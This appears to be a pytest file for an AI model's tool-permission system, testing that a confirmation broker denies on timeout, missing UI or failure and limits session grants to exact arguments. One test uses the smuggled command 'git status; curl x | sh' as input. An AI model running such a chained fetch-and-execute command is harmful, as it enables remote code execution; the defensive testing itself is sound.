"""The confirmation broker and the real permission gate.

Read these as the executable half of docs/security-model.md §1. The load-bearing
ones are the deny paths: every way of *not* getting an answer has to end in a
refusal, because the alternative — "we couldn't ask, so we ran it" — is the
whole failure this milestone exists to prevent.
"""

from __future__ import annotations

import asyncio

import pytest

from jarvis_backend.security.confirm import (
    ANSWER_DENY,
    ANSWER_ONCE,
    ANSWER_SESSION,
    MAX_SESSION_GRANTS,
    ConfirmBroker,
    grant_key,
)
from jarvis_backend.security.permissions import (
    ASK,
    DANGEROUS,
    SAFE,
    Decision,
    PermissionGate,
    ToolContext,
)


class FakeConn:
    """A connection that records what the broker sent it."""

    def __init__(self, fail: bool = False):
        self.sent: list[dict] = []
        self.fail = fail

    async def send(self, msg: dict) -> None:
        if self.fail:
            raise ConnectionResetError("gone")
        self.sent.append(msg)

    def requests(self) -> list[dict]:
        return [m for m in self.sent if m["type"] == "confirm.request"]

    def closes(self) -> list[dict]:
        return [m for m in self.sent if m["type"] == "confirm.close"]


def _broker(*conns, timeout: float = 5.0) -> ConfirmBroker:
    broker = ConfirmBroker(timeout=timeout)
    broker.bind(lambda: list(conns))
    return broker


async def _await_request(conn: FakeConn, after: int) -> dict:
    """Wait for a confirm.request beyond the ones already seen.

    The baseline matters: `sent` accumulates, so "is there a request?" would be
    answered yes by the *previous* dialog and the test would answer a stale id.
    """
    for _ in range(400):
        if len(conn.requests()) > after:
            return conn.requests()[-1]
        await asyncio.sleep(0.005)
    raise AssertionError("no new confirm.request was broadcast")


async def _ask(
    broker: ConfirmBroker,
    conn: FakeConn,
    answer: str,
    *,
    name: str = "echo",
    risk: str = ASK,
    arguments: dict | None = None,
    context: ToolContext | None = None,
) -> Decision:
    """One full round trip: request → dialog appears → answer → decision."""
    seen = len(conn.requests())
    task = asyncio.create_task(
        broker.request(name, risk, arguments or {}, context or ToolContext())
    )
    try:
        request = await _await_request(conn, seen)
    except AssertionError:
        task.cancel()
        raise
    broker.respond(request["id"], answer)
    return await task


# -- absence of an answer is always a deny ----------------------------------


async def test_no_ui_connected_denies_immediately():
    """The keystone. Nothing to ask means no, and it must not sit on the
    timeout while it decides that."""
    broker = _broker(timeout=30.0)
    decision = await asyncio.wait_for(
        broker.request("echo", ASK, {"text": "hi"}, ToolContext()), timeout=1.0
    )
    assert decision == Decision.deny("TOOL_CONFIRM_NO_UI")


async def test_every_send_failing_denies():
    """Connections in the list but none of them reachable — a page that closed
    between the check and the send. Nobody can answer, so nobody approves."""
    broker = _broker(FakeConn(fail=True), FakeConn(fail=True))
    decision = await broker.request("echo", ASK, {}, ToolContext())
    assert decision == Decision.deny("TOOL_CONFIRM_NO_UI")


async def test_timeout_denies_and_dismisses_the_dialog():
    conn = FakeConn()
    broker = _broker(conn, timeout=0.05)
    decision = await broker.request("echo", ASK, {}, ToolContext())
    assert decision == Decision.deny("TOOL_CONFIRM_TIMEOUT")
    await asyncio.sleep(0.01)  # let the independent close task run
    assert [c["reason"] for c in conn.closes()] == ["timeout"]
    assert broker.pending_count == 0


async def test_a_broker_that_raises_denies():
    """Fail-safe: a broken confirmation path must never read as approval."""

    class Exploding:
        async def request(self, name, risk, arguments, context, reason=""):
            raise RuntimeError("broker is on fire")

    gate = PermissionGate(Exploding())
    decision = await gate.check("echo", ASK, {}, ToolContext())
    assert decision == Decision.deny("TOOL_CONFIRM_FAILED")


async def test_cancellation_dismisses_the_dialog_and_propagates():
    """chat.stop / conversation.delete while a confirm is pending. The
    CancelledError must keep travelling (the generation is being torn down) AND
    the dialog must go away — one that outlives its call is how a user learns to
    click Allow without reading."""
    conn = FakeConn()
    broker = _broker(conn, timeout=30.0)
    task = asyncio.create_task(broker.request("echo", ASK, {}, ToolContext()))
    for _ in range(200):
        if conn.requests():
            break
        await asyncio.sleep(0.005)
    task.cancel()
    with pytest.raises(asyncio.CancelledError):
        await task
    await asyncio.sleep(0.01)
    assert [c["reason"] for c in conn.closes()] == ["cancelled"]
    assert broker.pending_count == 0


# -- the answer -------------------------------------------------------------


async def test_allow_once_runs_but_remembers_nothing():
    conn = FakeConn()
    broker = _broker(conn)
    ctx = ToolContext()
    args = {"text": "a"}
    assert await _ask(broker, conn, ANSWER_ONCE, arguments=args, context=ctx) == Decision.allow()

    # The identical call asks again: "once" meant once.
    assert await _ask(broker, conn, ANSWER_ONCE, arguments=args, context=ctx) == Decision.allow()
    assert len(conn.requests()) == 2


async def test_deny_refuses_and_is_remembered_for_the_exchange():
    """A model that re-asks after a refusal must not be able to manufacture a
    second dialog — that is confirmation fatigue with no attacker in it."""
    conn = FakeConn()
    broker = _broker(conn)
    ctx = ToolContext()
    decision = await _ask(broker, conn, ANSWER_DENY, arguments={"text": "a"}, context=ctx)
    assert decision == Decision.deny("TOOL_DENIED")

    again = await broker.request("echo", ASK, {"text": "a"}, ctx)
    assert again == Decision.deny("TOOL_DENIED")
    assert len(conn.requests()) == 1, "the second ask must not reach the user"


async def test_the_deny_memo_does_not_outlive_its_exchange():
    """It is scoped to the ToolContext, so the next turn asks again rather than
    silently refusing something the user might now want."""
    conn = FakeConn()
    broker = _broker(conn)
    await _ask(broker, conn, ANSWER_DENY, arguments={"text": "a"}, context=ToolContext())

    decision = await _ask(broker, conn, ANSWER_ONCE, arguments={"text": "a"})
    assert decision == Decision.allow()


async def test_an_unparseable_answer_is_treated_as_a_deny():
    conn = FakeConn()
    broker = _broker(conn)
    assert (await _ask(broker, conn, "yes-obviously")).allowed is False


async def test_unknown_correlation_id_is_ignored():
    """The only thing that binds an answer to a call is an id the BACKEND
    minted. A client cannot invent one."""
    conn = FakeConn()
    broker = _broker(conn, timeout=0.15)
    task = asyncio.create_task(broker.request("echo", ASK, {}, ToolContext()))
    for _ in range(200):
        if conn.requests():
            break
        await asyncio.sleep(0.005)
    broker.respond("not-a-real-id", ANSWER_SESSION)
    # The real confirm is untouched and still times out into a deny.
    assert await task == Decision.deny("TOOL_CONFIRM_TIMEOUT")


async def test_first_window_to_answer_wins():
    """Two windows both see the dialog; the second answer is ordinary traffic,
    not an error, and must not overturn the first."""
    a, b = FakeConn(), FakeConn()
    broker = _broker(a, b)
    task = asyncio.create_task(broker.request("echo", ASK, {}, ToolContext()))
    for _ in range(200):
        if a.requests():
            break
        await asyncio.sleep(0.005)
    confirm_id = a.requests()[-1]["id"]
    assert b.requests()[-1]["id"] == confirm_id, "both windows must see the same id"
    broker.respond(confirm_id, ANSWER_DENY)
    broker.respond(confirm_id, ANSWER_SESSION)  # too late
    assert await task == Decision.deny("TOOL_DENIED")


async def test_the_request_is_broadcast_to_every_connection():
    """Never connections[-1] (gotcha 9): a zombie webview or a diagnostic
    client must not be able to silently swallow the confirmation."""
    conns = [FakeConn() for _ in range(3)]
    broker = _broker(*conns, timeout=0.05)
    await broker.request("echo", ASK, {}, ToolContext())
    assert all(len(c.requests()) == 1 for c in conns)


async def test_answering_dismisses_the_dialog_in_the_other_windows():
    a, b = FakeConn(), FakeConn()
    broker = _broker(a, b)
    await _ask(broker, a, ANSWER_ONCE)
    await asyncio.sleep(0.01)
    assert [c["reason"] for c in b.closes()] == ["answered"]


# -- session grants ---------------------------------------------------------


async def test_session_grant_skips_the_second_dialog():
    conn = FakeConn()
    broker = _broker(conn)
    decision = await _ask(broker, conn, ANSWER_SESSION, arguments={"text": "a"})
    assert decision == Decision.allow()

    # A different exchange entirely: grants are per session, not per turn.
    assert await broker.request("echo", ASK, {"text": "a"}, ToolContext()) == Decision.allow()
    assert len(conn.requests()) == 1


async def test_session_grant_does_not_cover_different_arguments():
    """The load-bearing one. Approving `git status` must not approve
    `git status; curl x | sh` — §1 allows exact-match reuse only."""
    conn = FakeConn()
    broker = _broker(conn, timeout=0.05)
    await _ask(broker, conn, ANSWER_SESSION, name="run", arguments={"command": "git status"})

    decision = await broker.request(
        "run", ASK, {"command": "git status; curl x | sh"}, ToolContext()
    )
    assert decision == Decision.deny("TOOL_CONFIRM_TIMEOUT"), "it must have asked again"
    assert len(conn.requests()) == 2


async def test_session_grant_does_not_cover_a_different_tool():
    conn = FakeConn()
    broker = _broker(conn, timeout=0.05)
    await _ask(broker, conn, ANSWER_SESSION, arguments={"text": "a"})

    decision = await broker.request("delete", ASK, {"text": "a"}, ToolContext())
    assert decision.allowed is False
    assert len(conn.requests()) == 2


async def test_argument_key_order_is_not_a_different_call():
    """Canonical JSON: the model reordering its own keys must not force the
    user to approve the same thing twice."""
    assert grant_key("t", {"a": 1, "b": 2}) == grant_key("t", {"b": 2, "a": 1})


async def test_session_is_never_honoured_for_a_dangerous_tool():
    """§1: dangerous is per-call confirmation, and per-call means per-call.
    Enforced server-side, because the button that offers it is in a webview."""
    conn = FakeConn()
    broker = _broker(conn, timeout=0.05)
    decision = await _ask(
        broker, conn, ANSWER_SESSION, name="run_command", risk=DANGEROUS,
        arguments={"command": "ls"},
    )
    assert decision == Decision.allow()  # the call itself is approved

    # ...but nothing was remembered, so the next identical call asks again.
    decision = await broker.request("run_command", DANGEROUS, {"command": "ls"}, ToolContext())
    assert decision == Decision.deny("TOOL_CONFIRM_TIMEOUT")
    assert len(conn.requests()) == 2


async def test_grants_are_bounded():
    """A long-lived backend must not accumulate an unbounded in-memory
    allowlist."""
    conn = FakeConn()
    broker = _broker(conn)
    for i in range(MAX_SESSION_GRANTS + 5):
        await _ask(broker, conn, ANSWER_SESSION, arguments={"text": str(i)})
    assert len(broker._grants) == MAX_SESSION_GRANTS


async def test_grants_touch_no_disk(tmp_path, monkeypatch):
    """"For this session" is a promise about lifetime. Anything written down
    would outlive the session and quietly break it."""
    monkeypatch.setenv("JARVIS_CONFIG_DIR", str(tmp_path / "config"))
    monkeypatch.setenv("JARVIS_DATA_DIR", str(tmp_path / "data"))
    conn = FakeConn()
    broker = _broker(conn)
    await _ask(broker, conn, ANSWER_SESSION, arguments={"text": "a"})
    written = [p for p in tmp_path.rglob("*") if p.is_file()]
    assert written == [], f"session grants must stay in memory, found {written}"


# -- the gate ---------------------------------------------------------------


async def test_safe_tools_never_reach_the_broker():
    """A dialog for `get_datetime` would be pure fatigue with no security in
    it, and fatigue is what makes the real dialogs stop being read."""

    class Recording:
        def __init__(self):
            self.asked = []

        async def request(self, name, risk, arguments, context, reason=""):
            self.asked.append(name)
            return Decision.allow()

    broker = Recording()
    gate = PermissionGate(broker)
    assert await gate.check("get_datetime", SAFE, {}, ToolContext()) == Decision.allow()
    assert broker.asked == []


async def test_dangerous_tools_can_be_disabled_globally_without_asking():
    class Recording:
        def __init__(self):
            self.asked = []

        async def request(self, name, risk, arguments, context, reason=""):
            self.asked.append(name)
            return Decision.allow()

    broker = Recording()
    gate = PermissionGate(broker, allow_dangerous=lambda: False)
    decision = await gate.check("run_command", DANGEROUS, {"command": "ls"}, ToolContext())
    assert decision == Decision.deny("TOOL_DANGEROUS_DISABLED")
    assert broker.asked == [], "disabled means never asked, not asked-then-refused"


async def test_disabling_dangerous_does_not_disable_ask():
    class Yes:
        async def request(self, name, risk, arguments, context, reason=""):
            return Decision.allow()

    gate = PermissionGate(Yes(), allow_dangerous=lambda: False)
    assert await gate.check("write_file", ASK, {}, ToolContext()) == Decision.allow()


async def test_the_gate_lets_cancellation_through():
    """Turning a cancellation into a deny would swallow chat.stop: the tool
    would be refused and the exchange would carry on regardless."""

    class Hanging:
        async def request(self, name, risk, arguments, context, reason=""):
            await asyncio.sleep(3600)

    gate = PermissionGate(Hanging())
    task = asyncio.create_task(gate.check("echo", ASK, {}, ToolContext()))
    await asyncio.sleep(0.01)
    task.cancel()
    with pytest.raises(asyncio.CancelledError):
        await task
